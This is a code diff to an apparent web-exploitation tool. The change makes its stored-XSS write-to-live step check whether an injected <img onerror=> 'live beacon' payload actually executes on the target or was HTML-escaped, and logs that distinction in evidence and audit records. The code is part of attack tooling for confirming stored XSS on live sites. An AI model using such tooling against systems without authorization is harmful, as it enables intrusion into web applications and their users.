@@ -4983,14 +4983,87 @@ def _control_deck_write_to_live(exploitable, executor, file_mgr,
     marker_present = (tag in post_body)
     body_changed = (pre_hash != post_hash)
 
+    # Context-execution check. Marker being IN the body is not the
+    # same as the payload ACTUALLY executing. For stored_xss:
+    #   - marker-comment lands as <!-- ... tag ... -->  (inert, OK)
+    #   - marker-text lands as [gs-write-live tag]      (inert, OK)
+    #   - marker-img must land as an actual <img ...>   (executable)
+    #   - LIVE-BEACON must land as <img ... onerror=    (executable)
+    # If the target HTML-escapes our payload, we'll still see the
+    # TAG in the body (because the tag characters are safe) but the
+    # surrounding payload will be escaped. Operator must NOT be
+    # told 'payload is live' when the payload was neutralized.
+    context_note = ""
+    exec_confirmed = False
+    if marker_present and p_label.startswith("LIVE-BEACON"):
+        # The payload was <img ... onerror="..."> — if the server
+        # HTML-escapes it, we'd see the verbatim onerror=" in body
+        # rather than onerror=". Check both.
+        escaped_markers = ("&lt;img", "&lt;IMG", "&amp;#60;img",
+                            "&#60;img", "&#x3c;img",
+                            "&quot;gs-none&quot;")
+        raw_img = f'alt="gs-w-{tag}"'
+        # If any escape pattern encloses the marker, payload is neutered.
+        escaped_near = False
+        for em in escaped_markers:
+            if em in post_body:
+                # Further: check that the escape is within ~500
+                # chars of our tag (not just somewhere else on the
+                # page).
+                tag_idx = post_body.find(tag)
+                em_idx = post_body.find(em)
+                if tag_idx >= 0 and em_idx >= 0 and \
+                        abs(em_idx - tag_idx) < 1500:
+                    escaped_near = True
+                    break
+        if escaped_near:
+            context_note = ("payload appears HTML-ESCAPED near the "
+                            "marker — onerror= will NOT fire, no JS "
+                            "execution, no beacon will arrive")
+        elif raw_img in post_body:
+            # Raw attribute preserved — good sign.
+            exec_confirmed = True
+            context_note = ("payload rendered as a REAL <img> tag "
+                            "(raw attribute present) — onerror= should "
+                            "fire on visit")
+        else:
+            context_note = ("marker present but surrounding <img>/"
+                            "onerror= attributes NOT detected — payload "
+                            "may be partially escaped; do NOT assume "
+                            "execution")
+    elif marker_present and p_label.startswith("marker-img"):
+        raw_img = f'alt="gs-w-{tag}"'
+        if raw_img in post_body:
+            exec_confirmed = True
+            context_note = ("payload rendered as a real <img> tag "
+                            "(inert, intended)")
+        else:
+            context_note = ("marker tag is present but the <img> "
+                            "wrapper was sanitized away — payload "
+                            "is effectively just plain text")
+    elif marker_present:
+        # marker-comment / marker-text: inert by design, marker
+        # presence IS the whole proof.
+        exec_confirmed = True
+        context_note = "inert marker payload; presence IS the proof"
+
     print()
     print(f"  {B}Verify:{N}")
     print(f"    pre:  HTTP {pre_status}  hash={pre_hash}  "
           f"({len(pre_body)} B)")
     print(f"    post: HTTP {post_status}  hash={post_hash}  "
           f"({len(post_body)} B)")
-    if marker_present:
-        ok(f"MARKER FOUND — payload is live at render URL.")
+    if marker_present and exec_confirmed:
+        ok(f"MARKER FOUND + context OK — payload is live at "
+           f"render URL.")
+        if context_note:
+            info(f"  context: {context_note}")
+    elif marker_present and not exec_confirmed:
+        warn(f"MARKER FOUND but context looks neutralized.")
+        if context_note:
+            warn(f"  context: {context_note}")
+        warn("Inspect the rendered HTML manually before claiming "
+             "'stored XSS confirmed' in the report.")
     elif body_changed:
         warn("Render page CHANGED but marker not found. Payload may "
              "have been sanitized/encoded, or rendered in a different "
@@ -5026,6 +5099,8 @@ def _control_deck_write_to_live(exploitable, executor, file_mgr,
             "post_bytes": len(post_body),
             "marker_found": marker_present,
             "body_changed": body_changed,
+            "exec_confirmed": exec_confirmed,
+            "context_note": context_note,
         },
     }
     blob = json.dumps(ev, indent=2)
@@ -5037,20 +5112,36 @@ def _control_deck_write_to_live(exploitable, executor, file_mgr,
     ok(f"Evidence saved → {ev_path.name} (0o600, ephemeral).")
     chain_data["last_write_tag"] = tag
     chain_data["last_write_marker_found"] = "1" if marker_present else "0"
+    chain_data["last_write_exec_confirmed"] = \
+        "1" if exec_confirmed else "0"
     chain_data["last_write_render_url"] = render_url
 
     # 12. Audit at CRITICAL risk.
+    # 'success' = exec_confirmed, NOT merely marker_found. A marker
+    # in the page but HTML-escaped around it is NOT a live XSS;
+    # calling it one would be the exact simulation/placeholder
+    # issue the operator called out.
     audit.log("write_live_commit",
               f"{etype} inject={_tsafe_preview(inject_url, 60)} "
-              f"marker_found={marker_present}",
+              f"marker_found={marker_present} "
+              f"exec_confirmed={exec_confirmed}",
               risk=AuditTrail.RISK_CRITICAL,
-              success=marker_present)
-    if marker_present:
-        audit_alert = (f"LIVE WRITE SUCCEEDED: {etype} at "
+              success=exec_confirmed)
+    if exec_confirmed:
+        audit_alert = (f"LIVE WRITE CONFIRMED: {etype} at "
                        f"{_tsafe_preview(inject_url, 60)} — tag={tag}")
         audit.log("ALERT_live_write_success",
                   audit_alert,
                   risk=AuditTrail.RISK_CRITICAL)
+    elif marker_present and not exec_confirmed:
+        # Still a CRITICAL event — we DID write to the target —
+        # but the exploit was neutralized. Log a distinct action
+        # so the report can tell these apart.
+        audit.log("write_live_neutralized",
+                  f"{etype} marker present but escaped/sanitized: "
+                  f"{_tsafe_preview(context_note, 80)}",
+                  risk=AuditTrail.RISK_CRITICAL,
+                  success=False)
 
     # 13. Revert attempt (best-effort). Overwrite the same field
     # with an empty string via the SAME method. For GET we can't
